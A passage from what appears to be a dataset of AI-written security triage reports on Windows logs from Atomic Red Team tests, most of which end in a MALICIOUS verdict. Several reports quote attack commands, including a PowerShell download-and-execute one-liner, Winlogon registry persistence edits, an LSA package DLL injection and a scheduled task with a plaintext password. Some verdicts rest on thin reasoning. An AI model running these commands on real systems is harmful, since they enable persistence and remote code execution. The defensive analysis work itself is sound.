- Identify whether this was part of an authorized security assessment or a real intrusion.
- Isolate affected systems to prevent further spread.
- Conduct memory and disk analysis on the affected host to identify any other persistent threats.
- Review access logs and network connections during the incident timeframe to identify possible intrusion vectors.
- Consider resetting credentials for the involved accounts, especially `admin_test`.
- Enhance monitoring and ensure logging capability is restored on the affected systems.
- Educate IT staff on recognizing and handling such incidents and ensure that unauthorized tools like Atomic Red Team are not deployed in production environments without explicit consent and notification."
Winlogon Shell Key Persistence - PowerShell,"Based on the analysis of the provided logs, there are several indicators of potentially malicious activity:

1. **Event Clearing:**
   - The `Security`, `System`, and `Windows PowerShell` logs have been cleared as evidenced by the events from `1102` in the Security log and `104` in the System log. The process used `wevtutil.exe` to clear logs which is typically a red flag indicating possible malicious intent, as attackers often clear logs to cover their tracks.

2. **Suspicious PowerShell Activity:**
   - There is evidence of potentially malicious PowerShell usage. The command invoked is `Set-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"" ""Shell"" ""explorer.exe, C:\\Windows\\System32\\cmd.exe"" -Force` from a PowerShell environment. This command changes the user's shell value, effectively allowing for an additional command prompt to be executed each time Windows Explorer is opened. This is commonly used as a persistence mechanism by attackers.

3. **Utilization of Windows Services and System Processes:**
   - The logs show several executions of `wevtutil.exe` by the `admin_test` user, likely involved in clearing the event logs (`Security`, `System`, and `Windows PowerShell`). There is also evidence of usage of key system executables like `whoami.exe`, `hostname.exe`, and others, which could indicate reconnaissance steps by an intruder.

4. **Unusual Time Adjustments:**
   - There are several `EventID 4616` events indicating changes in the system time. Although time changes can occur for legitimate reasons, when coupled with other suspicious activities, they may suggest attempts to manipulate or match timestamps in logs altered by an attacker.

From this evidence, it appears there is a strong indication of active compromise or malicious actions on the investigated Windows host.

**Final Assessment: MALICIOUS**

**Recommended Actions:**
- Immediately isolate the affected system from the network to prevent further potential compromise.
- Conduct a thorough forensic analysis to understand the extent and impact of the breach.
- Review user account activities, especially focusing on the `admin_test` user and any other potentially compromised accounts.
- Assess and improve security measures to detect and prevent similar attacks in the future, including better logging and alerting mechanisms.
- Evaluate and apply patches or security updates that could prevent similar vulnerabilities exploited by the attacker."
LockBit Black - Modify Group policy settings -cmd,"**Detailed Analysis of Logs:**

Upon reviewing the provided logs from the Windows host, several events indicate potentially suspicious or malicious activity. Below is a detailed analysis of the logs focusing on those activities:

1. **Log File Clearing:**
   - **System Log and Security Log:**
     - Multiple log file clearing actions are noted (EventID 104 and EventID 1102). The events show logs being cleared for System, Windows PowerShell, and Security channels by the user ""admin_test"".
     - Log clearing without formal administrative maintenance or task is generally suspicious as it might indicate an attempt to hide malicious activities.

2. **Potential Malware or Unauthorized Access:**
   - **Sysmon Log:**
     - There are several entries involving the execution of `wevtutil.exe` with the `cl` (clear log) command which further supports the deliberate clearing of logs.
     - The execution of `cmd.exe` with several `reg add` commands appears unusual, especially when editing registry settings related to Group Policy refresh time and SmartScreen settings. Such commands can be used for persistence or to disable security features.

3. **Registry Modifications:**
   - The logs contain entries of `cmd.exe` being used to alter registry settings related to Group Policy and SmartScreen (EventID 1, multiple instances). Disabling or modifying these settings can weaken system security and signal potentially malicious configurations.

4. **Time Changes:**
   - **System Log and Security Log:**
     - Time change events (EventID 4616) were initiated by `svchost.exe`, altering the system time. While a single time change might be benign, repeated or clustered time changes can be an indicator of an attempt to bypass time-based security mechanisms or obscure timestamps in logs.

5. **Unusual Execution Patterns:**
   - Programs such as `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe` were executed multiple times within a short time frame under the same user context (""admin_test""). This could be indicative of reconnaissance or preparation for further actions.

**Assessment and Guidance:**

Based on the analysis of the logs, the following resolution is determined:

- **Resolution: MALICIOUS**

The actions observed within the logs, such as clearing of logs, registry modifications aimed at disabling security features, and consistent usage of administrative utilities to alter the state of the system, are strong indicators of a security compromise. The user ""admin_test"" appears to be central to these actions, potentially as a compromised account executing malicious activities or as a threat actor itself.

**Guidance for Next Steps:**

- Immediately investigate the user ""admin_test"" activities and credentials for signs of compromise.
- Review change management processes to ensure these actions had no legitimate administrative purpose.
- Analyze the environment for additional signs of malware or active threats, focusing on behavioral and threat intelligence.
- Consider isolating the affected system (""Server002"") from the network to prevent further damage or data exfiltration.
- Conduct a full forensic investigation of the system to uncover further indicators of compromise (IOCs) and understand the breach's scope and impact.
- Review and strengthen security policies, particularly those related to log management and user privileges, to mitigate future risks."
Domain Password Policy Check: Short Password,"Based on the analysis of the provided Windows event logs, there are several indicators of potentially malicious activity indicating actions aimed to obfuscate or compromise the system:

1. **PowerShell Activity**: The PowerShell logs show a script that manages user credentials located at `$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt`. The script checks for stored credentials, compares passwords, attempts to change the Active Directory account password, and updates the credential file with the new password. The specific password ""Uplow-1"" appears hard-coded, and this behavior can be indicative of suspicious or unauthorized password management or testing of password policies.

2. **Event Log Clearing**: Multiple Sysmon and Security logs indicate the execution of `wevtutil.exe` with arguments that suggest clearing event logs (e.g., `cl System`, `cl Application`, `cl Security`, `cl ""Windows PowerShell""`). Additionally, there are `EventID 104` (System log) and `EventID 1102` (Security log) entries indicating that logs have been cleared by the user `admin_test`. Clearing event logs is a classic indicator of anti-forensic activity aimed at covering up tracks on a Windows system.

3. **Variable Usage of System Utilities**: The frequent execution of system utilities (e.g., `whoami.exe`, `hostname.exe`, `wevtutil.exe`) under a high integrity context by the user `admin_test` suggests an active attempt to check system status, environment, and log data potentially preceding further actions.

4. **Integrity Level and Privilege**: The logs show operations being made at a `High` integrity level under administrative privileges. This indicates that the processes can perform significant changes to the system, which, combined with other findings (e.g., log clearing), enhances the risk assessment.

In conclusion, these event activities align with patterns seen in system compromises where adversaries attempt to change passwords, query system information, and clear logs to erase evidence of their presence. Based on the clear indications of anti-forensic behaviors and potentially unauthorized credential management:

**Resolution: MALICIOUS**

**Guidance:**
- Initiate an immediate incident response to contain and isolate the affected system(s).
- Conduct a comprehensive investigation to identify the source of unauthorized actions and the extent of the compromise.
- Review and, if necessary, disable the compromised user account `admin_test`.
- Alert the security team and stakeholders about the breach.
- Strengthen security controls, including monitoring, logging, and access controls, to prevent future incidents.
- Consider a full security audit or compromise assessment across the network to ensure no further threats persist.

The findings should be documented and shared with appropriate security and IT personnel to ensure coordinated and effective containment and mitigation actions."
Allowing custom application to execute during new RDP logon session,"Upon analysis of the provided Windows event logs, I've identified the following details that might be suspicious and warrant further investigation:

1. **Clearing of Event Logs**:
   - The logs show multiple instances of event logs being cleared. Specifically, event logs related to the Security, System, Windows PowerShell, and Application were cleared by the user `admin_test` (Event ID 1102, 104). This is often a technique used by malicious actors to cover up their tracks after performing unauthorized or suspicious activities.

2. **Registry Modification**:
   - There is evidence of registry modification via the command line, specifically aimed at altering startup programs (Sysmon Event ID 1). In one instance, the command included the execution of ""calc"" through registry keys for the Terminal Server (EventRecordID 17978). This could be an attempt to maintain persistence or execute unauthorized code.

3. **Suspicious PowerShell Activity**:
   - The logs contain events indicating PowerShell executions with restricted policy settings (`ExecutionPolicy Restricted`) and specific command lines being used (PowerShell Event ID 600). These include unusual PowerShell commands that need further investigation to understand their intent.

4. **High Privilege Assignments**:
   - Multiple logon events (Event ID 4624) indicate SYSTEM level activities. Event ID 4672 shows that users were assigned high privileges including debug and impersonate privileges which are often not necessary for normal operations.

5. **Frequent Credential Access Attempt Failures**:
   - Event ID 5379 shows failed attempts to access credentials with return code `3221226021`. This kind of activity can indicate an attempt to access or enumerate credentials, which could be part of lateral movement or credential theft.

Given the findings, notably the clearing of event logs, the registry modification to include startup programs, and suspicious PowerShell commands, the activities recorded in these logs are concerning.

**Resolution: SUSPICIOUS**

### Recommendations:
- **Immediate Investigation**: Further investigate the `admin_test` account’s activities, as it is involved in clearing logs and running processes that modify critical areas (e.g., registry).
- **Forensic Analysis**: Conduct a memory dump analysis and review network traffic around the timestamps of these events.
- **User Activity Review**: Examine other systems for similar patterns if this is part of a broader issue.
- **Audit and Monitoring**: Ensure that auditing and monitoring controls are robust and improved to capture similar instances in the future.

These actions should help determine if these events were indeed part of a malicious activity and prevent future occurrences."
WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,"### Detailed Analysis of Windows Event Logs:

#### **1. Analysis of System Logs:**
- **Log Clearance Events:**
  - Multiple log clearance events (EventID 104) for the ""System,"" ""Windows PowerShell,"" and ""Security"" logs by a user named ""admin_test"" are suspicious.
  - The `wevtutil cl` command seen here is used to clear the event logs which is often a tactic by attackers to cover tracks after malicious activity.
- **Time Manipulation:**
  - Kernel-General EventID 1 and 24 indicate time changes. This activity could be indicative of an attacker attempting to manipulate system time for anti-forensic purposes.

#### **2. Analysis of Security Logs:**
- **Security Log Cleared:**
  - EventID 1102 shows the security log was cleared. This is a significant red flag as this action is often associated with malicious intent to hide traces.
  
#### **3. Analysis of Windows PowerShell Logs:**
- **Suspicious PowerShell Activity:**
  - Events related to PowerShell starting a session with a command to download and execute a script (`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')`) are highly indicative of malicious activity.
  - The URL points to a public repository which could potentially host malicious scripts.

#### **4. Analysis of Sysmon Logs:**
- **Process Execution:**
  - Frequent process execution of `wevtutil.exe`, which aligns with the event log clearance behavior.
  - Execution of PowerShell scripts directly from a Temp directory which is a common tactic for executing malicious scripts.

### **Assessment:**
The logs exhibit several indicators of compromise. The actions of clearing event logs, manipulating system time, and executing a suspicious PowerShell command indicate a likely malicious activity.

HKLM - Add atomic_test key to launch executable as part of user setup,"Based on the analysis of the provided logs, several key observations and assessments can be made:

1. **PowerShell Activity:**
   - The PowerShell logs indicate the execution of a script that modifies the registry to include a component named ""atomic_test"" and sets a ""StubPath"" to ""C:\\Windows\\System32\\calc.exe"". 
   - This script is likely an execution of a ""living off the land"" technique, where legitimate system binaries are used for potentially malicious purposes.
   - While opening the calculator may seem benign, the use of PowerShell to modify the registry and employ runonce.exe to execute a process automatically may suggest an attempt at persistence or testing.

2. **Sysmon Events:**
   - Multiple executions of `wevtutil.exe` are observed, which can be used to clear event logs (`cl` command) in channels like ""Application"", ""System"", ""Security"", and ""Windows PowerShell"".
   - Furthermore, there is repeated automated activity related to Microsoft Edge Update processes, although these seem benign as they occur under the `NT AUTHORITY\SYSTEM` user and appear consistent with expected update procedures.

3. **Security and System Logs:**
   - Importantly, the Security log (Event ID 1102) clearly shows that the Security event log was cleared by the user `admin_test`. This is a significant indicator of potential malicious intent or activity cover-up, as clearing event logs can be used to hide evidence of tampering or unauthorized actions.
   - Change in system time noted in Event ID 4616 suggests potential tampering with timestamps, possibly to manipulate log timelines.

4. **Assessment and Conclusion:**
   - The combination of registry modification through PowerShell, execution of system binaries in a potentially malicious manner, and the explicit clearing of security logs, all indicate that there is indeed activity suggesting compromise.
   - Given the indications of potentially nefarious activity (clearing of logs, unusual command usage, potential persistence mechanisms), it is reasonable to categorize this as a credible security concern.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

- **Immediate Actions:**
  - Isolate the host (Server002) from the network to prevent further potential lateral movement.
  - Conduct a deeper forensic investigation to determine the extent of the compromise, including memory analysis and a thorough investigation of all user accounts, especially `admin_test`.
  - Restore logs from backups if available and cross-reference these with other logs or alerts within the system to piece together the full timeline of activities.
  - Confirm the legitimacy of any scheduled tasks or cron jobs related to PowerShell scripts and registry modifications.

- **Long-term Strategies:**
  - Implement tighter monitoring, especially for PowerShell and command-line utility executions.
  - Conduct user training sessions to better identify and prevent suspicious activity.
  - Review and potentially tighten log retention policies and block unauthorized execution of scripts or commands that could clear logs.
"
Read-Write-Execute process Injection,"After analyzing the provided Windows event logs, several observations and indicators of suspicious activities have been identified:

1. **Repeated Event Log Clearing**: 
   - System, Windows PowerShell, and Security event logs have been cleared by the user `admin_test`. The corresponding event entries indicate the use of `wevtutil.exe` to clear these logs, which is a known technique often used by attackers to cover their tracks after executing malicious activities.

2. **Suspicious PowerShell Activity**:
   - There are multiple instances of `powershell.exe` executing commands from a directory associated with the Atomic Red Team T1055 technique. Specifically, commands involve `RWXinjectionLocal.exe` and `searchVuln.exe`, tools which are typically part of simulation frameworks used to test defense mechanisms related to process injection (T1055).

3. **High Integrity Level Processes**:
   - The processes involved in these activities, including PowerShell, are running with high integrity levels, suggesting administrative privileges. This could indicate a potential privilege escalation by the actor.

4. **Use of Common Windows Command-line Utilities**:
   - `wevtutil.exe` and `conhost.exe` are frequently seen. While `conhost.exe` is a legitimate process associated with console windows, its repeated invocation alongside wevtutil to clear logs is suspicious.

5. **Indicators of Potential Reconnaissance or Discovery**:
   - Commands to execute `whoami.exe` and `hostname.exe` may indicate attempts by the user or attacker to gather information about the system environment and the user context under which they are operating.

**Assessment**: The combination of log clearing, suspicious use of PowerShell with indication of malicious simulation framework, and privilege escalation activities strongly indicate malicious intent.

**Resolution**: **MALICIOUS**

**Recommendations for Mitigation and Response**:
- **Immediate Isolation**: Isolate the affected system (Server002) to prevent further malicious activity and propagation.
- **Forensic Analysis**: Conduct a full forensic analysis to understand the extent of the compromise, including memory dumps and disk analysis.
- **Review User Accounts**: Verify the identity and permissions of the `admin_test` account, as it may have been compromised.
- **Strengthen Monitoring and Logging**: Ensure centralized logging to maintain visibility even if local logs are cleared. Implement behavioral analysis tools to detect anomalous use of administrative tools and PowerShell.
- **User Training**: Educate users on safe computing practices and indicators of phishing/social engineering, which could be the initial vector for the compromise.
- **Patch Management**: Ensure all systems are up to date with security patches to mitigate exploitation of known vulnerabilities."
Scheduled task Remote,"Based on a thorough analysis of the provided Windows event logs, the following observations have been made:

### Suspicious or Anomalous Behavior:

1. **Log File Clearing**: 
   - There are multiple instances of log files being cleared across different channels (`System`, `Windows PowerShell`, and `Security`). 
   - The user involved is `admin_test` (UserID: S-1-5-21-3962163828-2803415714-1403596700-1006). The clearing of event logs without a legitimate reason can be an indicator of malicious activity attempting to cover tracks.

2. **Use of `wevtutil.exe`**: 
   - The execution of `wevtutil.exe` to clear logs from `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` is logged.
   - Execution of `wevtutil.exe` to clear event logs is often a tactic used by attackers to remove evidence of their malicious activities.

3. **Scheduled Task Creation**:
   - There is a suspicious command line invocation `cmd.exe /c SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong ...` that attempts to create a scheduled task named ""Atomic task.""
   - Creating scheduled tasks with command execution capabilities (`cmd.exe`) and especially using a high-integrity level context suggests automated task execution, potentially malicious if not a known administrative task.

4. **Execution of Windows Utilities**:
   - Multiple native Windows tools such as `whoami.exe`, `hostname.exe`, `cmd.exe`, alongside high-integrity processes (`IntegrityLevel: High`), are invoked. 
   - The sequence and timing could indicate an attempt to gather system information or execute tasks with elevated privileges.

### Potential Indicators of Compromise:

- **Event Log Manipulation**: Clearing of multiple log files across different categories by a potentially suspect account (`admin_test`).
- **Execution Patterns**: The invocation of `wevtutil.exe` during instances of log clearing.
- **Scheduled Task with Potential Malicious Intent**: Usage of `schtasks.exe` to create a task using a possibly sensitive account or credential (`At0micStrong`).

### Summary and Assessment:

The combination of log file clearing, scheduled task creation with high-integrity process execution, and the use of `wevtutil.exe` to clear logs suggests a concerted effort to perform activities while obfuscating traces. The behavior exhibited aligns with tactics associated with an attacker conducting operations on the system, and thus, it is indicative of potential compromise.

### Resolution: **MALICIOUS**

### Guidance:

1. **Immediate Incident Response**:
   - Conduct a thorough investigation on the system involved (Server002), focusing on the account `admin_test`.
   - Isolate the host if necessary to prevent further unauthorized access or data exfiltration.

2. **Review and Re-analysis**:
   - Cross-verify with any available network logs or alerts at the time of the events to identify potential lateral movement or external communication.

3. **Forensic Analysis**:
   - Preserve the current state of the machine by taking a forensic image for further detailed analysis.
   - Check for potential unauthorized access points, additional scheduled tasks, unauthorized user accounts, and any suspicious file modifications.

4. **Remediation**:
   - Update and patch the system to ensure security vulnerabilities are addressed.
   - Implement stricter logging and monitoring of privileged account activities moving forward.
   - Consider reviewing and enforcing Group Policy settings that limit the use of administrative tools like `wevtutil.exe` for unauthorized users.

This assessment leads to the conclusion that the activities within the logs indicate a malicious and likely unauthorized use of system processes, warranting immediate attention and action."
Section View Injection,"Upon reviewing the provided logs from the Windows host ""Server002,"" several key indicators suggest potential malicious activities:

1. **Log File Clearing:**
   - In both the security log (EventID 1102) and system log (EventID 104), there are entries indicating that logs were cleared by the user ""admin_test"" shortly after each other. Log clearing can be indicative of an attempt to erase evidence of malicious activities.

2. **Privilege Escalation:**
   - There are entries (EventID 4672) in the security log indicating special privileges (including SeDebugPrivilege, SeLoadDriverPrivilege) were assigned to ""admin_test"" which could enable further privilege escalation tactics or system manipulations.

3. **Time Change Events:**
   - Security log entries (EventID 4616) indicate discrepancies in system time settings, which could be used by an attacker to trace or cover tracks within various logs.

4. **Execution of Known Malicious Tools:**
   - The Sysmon log shows the execution of a command involving PowerShell executing a script from a folder named ""AtomicRedTeam"" followed by ""InjectView.exe"". Atomic Red Team is a well-known red-team toolset, and unusual execution from such directories is typically suspicious especially in environments where such tools should not be present.

5. **Suspicious Processes:**
   - The Windows PowerShell log indicates activity involving the script execution that opens ""InjectView.exe."" The use of PowerShell for launching processes often signals script-based attacks or penetration testing activities.

6. **Remote Connections and Elevated Privileges:**
   - Log entries showing an NTLM login from a remote IP (192.168.1.168) using ""admin_test,"" with elevated token activities can indicate compromised credentials or unauthorized access.

Based on these suspicious patterns and indicators which align with potential malicious behavior such as log tampering, time manipulation, privileged operations, and the use of penetration testing tools, the resolution is:

**Resolution: MALICIOUS**

**Guidance:**
1. **Immediate Response:**
   - Isolate the affected system to prevent further spread or access.
   - Ensure ""admin_test"" credentials are invalidated and require reset procedures.
   
2. **Investigation & Remediation:**
   - Conduct a thorough forensic analysis to identify the full scope and entry point of the attack.
   - Inspect network logs for connections to/from the IP 192.168.1.168.
   - Review other systems and logs for similar patterns of compromise.
   - Implement enhanced monitoring especially around logging and time settings.

3. **Preventive Measures:**
   - Enforce stricter policies on log retention and notification for log clearance activities.
   - Consider using SIEM solutions for centralized log management and real-time alerting.
   - Conduct a security policy audit, especially focusing on privileged account usage and permissions."
EarlyBird APC Queue Injection in Go,"In analyzing the provided logs from the Windows host, several points of interest suggest potential indicators of compromise. Let me break down the relevant findings:

1. **Clearing of Event Logs**:
   - The logs indicate that event logs have been cleared multiple times (e.g., EventID 1102 in Security log and EventID 104 in System log). Clearing of logs is often a sign of an attempt to cover tracks, as it removes evidence of previous actions on the system.

2. **Time Manipulation**:
   - The System log shows changes in system time (EventID 1, Version 2, in the System log). This action is typically suspicious and could be used to manipulate the timestamp of logs to mislead investigators.

3. **Execution of Suspicious Commands**:
   - There are multiple instances of `wevtutil.exe` being executed. While this tool is a legitimate Windows utility to manage event logs, its repeated execution in this context, coupled with cleared logs, suggests malicious intent.

4. **Unusual PowerShell Activity**:
   - A PowerShell process was observed executing a command potentially associated with Atomic Red Team tests (which simulate attack scenarios) using an executable `EarlyBird.exe`. The usage of Atomic Red Team tools can be part of a legitimate penetration test or can indicate malicious cyber threat emulation.

5. **High-Integrity Processes with Administrative User**:
   - Many processes were launched with high integrity under the user `SERVER002\\admin_test`, and this user has cleared logs, further linking this account to suspicious activity.

6. **Multiple Processes Without Parent-Process Information**:
   - Processes such as `whoami.exe` and `hostname.exe` do not have clear parent processes, raising questions about their exact origin. Though these are legitimate utilities, their execution in this context can contribute to a larger malicious narrative.

Based on the above points, the evidence strongly suggests that there was suspicious activity, if not outright malicious intent. While specific events might individually be benign or part of legitimate administrative operations, their combination — especially with log erasures, time manipulation, and obscure PowerShell activities — indicates a high risk of compromise or at least the potential for unauthorized actions.

### Assessment and Resolution
- **Assessment**: These logs provide strong indicators of potentially malicious activity, primarily due to the clearing of critical logs, system time manipulation, and unexplained high-integrity processes initiated by the admin user.
- **Resolution**: **MALICIOUS**. The activities observed suggest an attempt at obfuscation and unauthorized access consistent with malicious behavior. Immediate action should include isolating the affected system, reviewing user activity associated with the account `admin_test`, and conducting a comprehensive incident response plan to detect any additional compromise.

### Guidance:
1. **Immediate Isolation**: Isolate the host `Server002` from the network to prevent potential further unauthorized access.
2. **Review Account Activity**: Investigate activities associated with `admin_test` to evaluate and confirm the scope of privilege abuse or compromise.
3. **Incident Response**: Launch an incident response to examine all machines the affected account accessed or that were accessible from `Server002`.
4. **Log Analysis**: Extract logs from existing backup solutions or centralized logging if available, to reconstruct events and gather a coherent timeline.
5. **Communication and Recovery**: Communicate findings with the security team to address potential risks to other systems and start recovery protocols if necessary.

These measures will help determine the extent of the breach (if applicable) and facilitate steps to remediate and secure the affected system and organizational infrastructure."
Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"### Detailed Analysis of Logs

#### Application Logs
1. **edgeupdate Service Stopped**:
   - The logs indicate multiple instances of the `edgeupdate` service being stopped. This could be routine; however, frequent stops can indicate manipulation or troubleshooting attempts.

2. **SPP Event**:
   - The `SPP` log entry appears to be routine, related to the software protection platform.

#### Windows PowerShell Logs
1. **PowerShell Command Execution**:
   - A PowerShell session runs a script that modifies system registry entries for security packages. The script saves existing entries and injects `AtomicTest.dll` as a new security package. 
   - **This is highly suspicious** as modifying LSA security packages is indicative of attempts to inject malicious code or conduct lateral movement.

#### System Logs
1. **Log File Cleared**:
   - The logs show the user `admin_test` clearing the system, PowerShell, and security logs shortly after executing suspicious PowerShell commands.
   - **Clearing logs is a common tactic used by attackers to cover their tracks**, indicating malicious activity.

2. **Time Change Events**:
   - There are time modification events, which could relate to timezone adjustments or attempts to obscure log timestamps. 
   - While not inherently malicious, in conjunction with the cleared logs, this is worth investigating.

#### Security Logs
1. **Security Log Cleared**:
   - As noted earlier, the clearing of logs, especially security logs by `admin_test`, is indicative of malicious intent to remove traces of unauthorized actions.

#### Sysmon Logs
1. **Wevtutil Command Executions**:
   - `wevtutil.exe` was used with the `cl` (clear log) command against application, system, and security logs. 
   - Symptomatic of intentional erasure of logs, aligning with previous observations.

2. **PowerShell Launch with Parameters**:
   - Sysmon captured a PowerShell process executing the same security package manipulations seen in Windows PowerShell logs.
   
3. **MicrosoftEdgeUpdate Processes**:
   - Multiple EdgeUpdate processes appear legitimate given their nature and the system context in which they run.

### Assessment
- The registry modification to alter LSA security packages, clearing of logs, and use of `wevtutil.exe` to clear event logs strongly suggest malicious activity.
  
### Identified Threats and Risks
- **Malicious Registry Manipulation**: The registry was altered using PowerShell to inject potentially malicious DLLs, possibly achieving persistence or misuse of system security mechanisms.
- **Evidence Tampering**: Log files crucial for forensic analysis were cleared, suggesting an intent to hide footprints.

### Guidance and Resolution
- **Resolution: MALICIOUS**

### Immediate Actions:
1. **Isolate Host**: Isolate the affected host (Server002) from the network to prevent lateral movement or further damage.
2. **Forensic Analysis**: Conduct a complete forensic analysis on the isolated system, focusing on file system changes, loaded DLLs, and any network connections initiated around the event timestamps.
3. **Investigate `admin_test` Actions**: Review user `admin_test` access patterns and privileges to determine the extent of the user account's compromise or misuse.
4. **Patch and Review Security Controls**: Ensure all systems are patched, especially concerning known vulnerabilities.

"
Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,"Based on the analysis of the provided logs, here are the key observations related to potential indicators of malicious activity:

1. **Log File Clearing**:
   - The logs show multiple instances of event log clearing using `wevtutil.exe` (EventID `1102` and `104`). The command `wevtutil.exe cl Security` etc., indicates that the security logs were cleared. Log clearing is typically done by attackers to cover their tracks after compromising a system and is a strong indicator of malicious activity.

2. **Privileged Logon and Privilege Escalation**:
   - Multiple logon events (EventID `4624`) involving the SYSTEM account on a local machine might be normal, but they are associated with privilege escalation events (EventID `4672`) which include high privileges like `SeDebugPrivilege`, `SeTcbPrivilege`, `SeAssignPrimaryTokenPrivilege`, among others. These should be scrutinized to verify the context and necessity of such high privileges.
   
3. **Suspicious PowerShell Execution**:
   - The logs include services like `NtQueueApcThreadEx.exe -debug` executed via PowerShell (PowerShell log). The involvement of PowerShell and execution traces found in Temp directories and using obscured paths (like `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe`) suggest the potential execution of malicious scripts or penetration testing tools typically used for post-exploitation activities.

4. **Miscellaneous Observations**: 
   - The usage of obscure paths seen in command execution (e.g., `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam`) is synonymous with AD-Hoc or test-related malicious executions usually perpetrated by Attack Oriented Frameworks or Red Team exercises.

### Assessment:

Given the combination of cleared logs, executions indicating preparation towards or utilization of elevated privileges, and the presence of potentially malicious PowerShell activities, there are clear signs of malicious intent.

### Conclusion:

**Resolution: MALICIOUS**

### Guidance:

1. **Immediate Action**:
   - Isolate the affected system from the network to prevent further damage or data exfiltration.
   - Initiate an in-depth forensic investigation to understand the extent of the breach.

2. **Communication**:
   - Notify relevant stakeholders and prepare communication for any regulatory or compliance obligations if data exposure is confirmed.

3. **Review and Enhance Security Measures**:
   - Review and strengthen logging and monitoring to detect such activities in the future.
   - Ensure that all endpoints have updated security measures and consult cybersecurity frameworks like MITRE ATT&CK to understand the tactics and techniques better.
   
4. **Restore and Validate**:
   - Only after thorough cleaning and validation, reconnect the system to the network after ensuring all backdoors or persistent threats have been mitigated. 

These steps can help secure your environment and prevent such incidents in the future."
Winlogon Userinit Key Persistence - PowerShell,"Upon reviewing the provided Windows event logs for Server002, several indicators of suspicious and potentially malicious activity were identified:

### Analysis:

1. **PowerShell Activity:**
   - **Command:** `powershell.exe & {Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe"" -Force}`
     - **Suspicion:** This command modifies the Registry key associated with user login behavior. The inclusion of `cmd.exe` alongside `Userinit.exe` is not typical for legitimate administrative tasks and is often seen in persistence mechanisms used by malware.
     - **Implication:** This modification can enable a command prompt to open every time a user logs in, potentially allowing an attacker to execute commands with user privileges after every logon.

2. **Event Log Clearing:**
   - **System Log Event ID 104 and Security Log Event ID 1102:**
     - **Details:** Logs for System, Security, and Windows PowerShell channels were cleared almost simultaneously by the user `admin_test`.
     - **Suspicion:** Clearing of event logs is commonly used by attackers to cover tracks and is a well-known indicator of malicious activity.

3. **Process Execution - Sysmon Logs:**
   - **Suspicious Executions:** 
     - **Processes:** `wevtutil.exe` used to clear logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, `cl ""Windows PowerShell""`) under the context of `admin_test`.
     - **Tool:`whoami.exe`:** Executed by user `admin_test`, potentially to verify user account details.
   - **Suspected Purpose:** The usage pattern observed here, involving both log clearance tools and `whoami`, suggests actions that may correlate with an attempt to hide tracks and verify access.

4. **Edge Update Processes:**
   - Numerous `MicrosoftEdgeUpdate.exe` executions were noted. Although frequent Edge updates can be normal, their execution context (e.g., from temporary directories), command lines, and timing warrant further attention to distinguish between mundane update activities and potential misuse or masquerading.

### Assessment:

Given the combination of registry modifications to `Winlogon`, log clearance activities, and suspect process executions (specific command line including Windows administrative tools and system path references that are uncharacteristic), it's reasonable to classify the situation as a very high risk due to potential malware or unauthorized administrative access. 

### Recommendation:

- **Resolution:** **MALICIOUS**
- **Next Steps:**
  1. **Immediate Containment:**
     - Isolate the affected system from the network to prevent further spread or remote manipulation.
  2. **Forensic Analysis:**
     - Perform a comprehensive forensic analysis on the system, focusing on persistence mechanisms, lateral movement traces, and data exfiltration attempts.
  3. **Credential Usage Audit:**
     - Inspect the usage of `admin_test` credentials for any unauthorized or external access patterns.
  4. **Review Software Update Channels:**
     - Verify the integrity of Edge updates, particularly those executed from unexpected directories.
  5. **Remediation Actions:**
     - Reset affected configurations and registry keys, ensuring they conform to the security policies.
     - Review and harden user access permissions and event log configurations.
  6. **Threat Intelligence and Monitoring:**
     - Engage threat intelligence to ascertain if the activities align with known attacks.
     - Enhance monitoring for similar suspicious activities across other systems. 

These steps should be pursued urgently to mitigate potential ongoing threats and prevent recurrence."
Service Installation PowerShell,"Upon reviewing the provided Windows event logs, I have identified several indicators of potentially malicious activity. Here are the key observations:

1. **PowerShell Events**: 
   - The log entries indicate a PowerShell script was executed to create a new Windows service named ""AtomicTestService_PowerShell"", pointing to ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1543.003\\bin\\AtomicService.exe"". This binary path, particularly under a user's AppData folder, is highly unusual for a legitimate service and often indicative of malicious activity, simulating or testing TTPs (Tactics, Techniques, and Procedures) listed in the MITRE ATT&CK framework, specifically T1543.003 (Create or Modify System Process: Windows Service).

2. **System and Security Events**:
   - The system logs show multiple event log channels being cleared by the user `admin_test`. This action is suspicious as attackers sometimes clear event logs to cover their tracks after executing malicious activities.

3. **Sysmon Events**:
   - The Sysmon logs show a series of events related to `wevtutil.exe` clearing logs from different channels. These actions were conducted under a high integrity level and are suspect when performed in conjunction with unusual service creation or execution activities.
   - The logs indicate other processes, such as `svchost.exe` and several `EdgeUpdate` executables, running under the NT AUTHORITY\SYSTEM account. While these entries by themselves are typical, the activity surrounding them, in context with the other logs, suggests possible exploitation or misuse of system-level privileges.

4. **Edge Update Processes**:
   - The presence of numerous Microsoft Edge Update-related processes operating with system-level integrity periodically can be benign. However, the timing and correlation with anomalous service creation suggest they should be scrutinized further.

**Assessment and Resolution**:
The creation of services from unknown binaries in temporary directories, alongside the clearance of logs, is alarming and commonly related with malicious activities. This pattern of behavior often signifies attempts to evade detection or persistence mechanisms.

Based on the logs provided, there are clear indicators of malicious activity. The logs reveal behavior consistent with malware execution, potential privilege escalation, and attempts at covering tracks.

Therefore, the resolution is **MALICIOUS**.

**Guidance on How to Proceed**:
1. **Immediate Response**: 
